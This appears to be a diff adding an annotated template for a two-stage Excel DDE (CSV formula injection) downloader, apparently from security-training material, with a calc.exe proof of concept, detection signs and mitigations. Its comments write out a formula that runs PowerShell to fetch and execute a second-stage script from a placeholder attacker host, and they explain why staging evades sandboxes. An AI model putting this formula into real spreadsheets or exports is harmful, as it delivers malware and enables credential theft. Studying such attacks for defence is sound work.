@@ -1,0 +1,41 @@
+# Stage 1 DDE Downloader Template
+#
+# DISCLAIMER: Educational purposes ONLY. Do not use without authorization.
+# This demonstrates a staged DDE approach where Stage 1 is a minimal downloader.
+# PoC payload: calc.exe (Windows Calculator)
+#
+# TWO-STAGE DDE PATTERN:
+# ======================
+#
+# Stage 1 (this file - CSV):
+#   - Minimal DDE formula that only downloads Stage 2
+#   - Smaller footprint than full payload = less detection surface
+#   - DDE formula: triggers PowerShell to download stage 2
+#
+# Stage 2 (downloaded remotely):
+#   - Full payload execution
+#   - Credential harvesting
+#   - Persistence mechanisms
+#
+# WHY TWO STAGES?
+# ===============
+# Stage 1 only downloads a file - fewer behavioral indicators than full payload
+# Stage 2 can be updated server-side without resending Stage 1
+# Harder for sandboxes to fully analyze the complete chain
+#
+# EDUCATIONAL REPRESENTATION:
+# Stage 1 DDE formula would be:
+#   =CMD("cmd /c powershell -c (New-Object Net.WebClient).DownloadFile('http://[ATTACKER]/stage2.ps1','%TEMP%\s2.ps1');powershell -f %TEMP%\s2.ps1","")
+#
+# For PoC purposes only (calc.exe):
+#   =CMD("cmd /c calc.exe","")
+#
+# DETECTION:
+# - PowerShell spawned from Excel
+# - Network connection from Excel process
+# - Downloaded file execution from TEMP directory
+#
+# MITIGATION:
+# - Disable DDE via Group Policy
+# - Block outbound connections from Office processes
+# - Monitor for PowerShell spawned from Office applications
